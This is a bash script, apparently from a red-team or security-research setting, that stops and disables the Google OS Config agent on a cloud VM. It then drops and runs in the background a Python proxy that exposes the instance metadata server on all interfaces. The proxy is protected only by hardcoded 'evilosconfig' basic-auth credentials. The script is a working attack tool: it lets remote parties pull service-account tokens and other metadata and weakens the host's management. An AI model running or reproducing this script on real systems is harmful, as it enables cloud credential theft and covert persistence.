#!/bin/bash
systemctl stop google-osconfig-agent
systemctl disable google-osconfig-agent

cat > /opt/metadata-proxy.py << 'PYEOF'
#!/usr/bin/env python3
import base64
import http.server
import urllib.request
import sys

METADATA_HOST = "169.254.169.254"
LISTEN_PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 8080
EXPECTED_AUTH = "Basic " + base64.b64encode(b"evilosconfig:evilosconfig").decode()


class MetadataProxy(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        if self.headers.get("Authorization") != EXPECTED_AUTH:
            self.send_response(401)
            self.send_header("WWW-Authenticate", 'Basic realm="metadata-proxy"')
            self.end_headers()
            return

        url = f"http://{METADATA_HOST}{self.path}"
        req = urllib.request.Request(url)
        req.add_header("Metadata-Flavor", "Google")

        try:
            with urllib.request.urlopen(req, timeout=300) as resp:
                body = resp.read()
                self.send_response(resp.status)
                for key, val in resp.getheaders():
                    if key.lower() not in ("transfer-encoding", "connection"):
                        self.send_header(key, val)
                self.end_headers()
                self.wfile.write(body)
        except Exception as e:
            self.send_response(502)
            self.end_headers()
            self.wfile.write(str(e).encode())

    def log_message(self, fmt, *args):
        print(f"[proxy] {args[0]}")


if __name__ == "__main__":
    server = http.server.ThreadingHTTPServer(("0.0.0.0", LISTEN_PORT), MetadataProxy)
    server.daemon_threads = True
    print(f"Metadata proxy listening on 0.0.0.0:{LISTEN_PORT}")
    server.serve_forever()
PYEOF

nohup python3 -u /opt/metadata-proxy.py > /var/log/metadata-proxy.log 2>&1 &
